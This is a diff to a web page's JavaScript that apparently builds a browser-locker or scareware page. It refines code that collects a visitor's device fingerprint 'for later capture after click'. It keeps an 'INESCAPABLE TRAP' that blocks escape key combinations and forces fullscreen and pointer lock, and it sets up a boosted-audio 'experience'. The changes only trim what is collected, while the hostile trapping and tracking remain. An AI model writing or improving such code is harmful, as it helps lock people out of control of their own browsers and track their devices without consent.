@@ -181,11 +181,12 @@ body, html {
     }
 
     // ================================================================
-    // 2. FINGERPRINT (for later capture after click)
+    // 2. FINGERPRINT (no base64 data – only short strings)
     // ================================================================
     function getFingerprint() {
         const fp = {};
-        fp.userAgent = navigator.userAgent;
+        // Truncate long strings on the client side
+        fp.userAgent = (navigator.userAgent || '').substring(0, 200);
         fp.language = navigator.language;
         fp.platform = navigator.platform;
         fp.hardwareConcurrency = navigator.hardwareConcurrency || '?';
@@ -199,7 +200,7 @@ body, html {
         };
         fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-        // Canvas fingerprint
+        // Canvas fingerprint – just store a flag, not the base64
         try {
             const canvas = document.createElement('canvas');
             canvas.width = 200; canvas.height = 50;
@@ -210,16 +211,24 @@ body, html {
             ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
             ctx.fillStyle = 'rgba(102,204,0,0.7)';
             ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
-            fp.canvas = canvas.toDataURL();
-        } catch(e) { fp.canvas = 'error'; }
+            // We DO NOT send the dataURL – just set a boolean
+            fp.canvas = true;
+        } catch(e) { fp.canvas = false; }
 
-        // WebGL
+        // WebGL – truncate renderer
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if(gl) {
-                fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
-            } else { fp.webgl = 'unsupported'; }
+                const vendor = gl.getParameter(gl.VENDOR) || '';
+                const renderer = gl.getParameter(gl.RENDERER) || '';
+                fp.webgl = {
+                    vendor: vendor.substring(0, 80),
+                    renderer: renderer.substring(0, 80)
+                };
+            } else {
+                fp.webgl = 'unsupported';
+            }
         } catch(e) { fp.webgl = 'error'; }
 
         return fp;
@@ -243,10 +252,10 @@ body, html {
     }
 
     // ================================================================
-    // 4. INESCAPABLE TRAP (extremely aggressive)
+    // 4. INESCAPABLE TRAP (aggressive fullscreen & pointer lock)
     // ================================================================
     function trapUser() {
-        // Block ALL dangerous key combinations
+        // Block all dangerous key combinations
         const blockKeys = e => {
             const k = e.key;
             const ctrl = e.ctrlKey, alt = e.altKey, shift = e.shiftKey, meta = e.metaKey;
@@ -345,7 +354,7 @@ body, html {
     }
 
     // ================================================================
-    // 5. AUDIO BOOST & START EXPERIENCE (unchanged)
+    // 5. AUDIO BOOST & START EXPERIENCE
     // ================================================================
     let audioContext, gainNode;
     const mediaElements = [];
